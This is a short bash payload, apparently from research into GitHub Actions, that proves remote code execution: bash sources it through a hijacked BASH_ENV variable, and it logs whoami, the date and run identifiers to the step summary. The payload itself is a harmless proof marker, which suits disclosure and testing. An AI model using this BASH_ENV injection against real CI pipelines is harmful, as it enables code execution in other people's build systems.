# Experiment 2 payload - bash sources this automatically because BASH_ENV points here.
# v2: also echoes to stdout so the RCE proof lands in the step log.
echo "PWNED: pwn.sh was sourced by bash via BASH_ENV (whoami=$(whoami))"
{
  echo "## RCE PROOF (experiment 2)"
  echo "- pwn.sh was sourced by bash via \$BASH_ENV"
  echo "- whoami: $(whoami)   date: $(date -u +%FT%TZ)"
  echo "- action: ${GITHUB_ACTION:-?}   run_id: ${GITHUB_RUN_ID:-?}"
} >> "$GITHUB_STEP_SUMMARY"
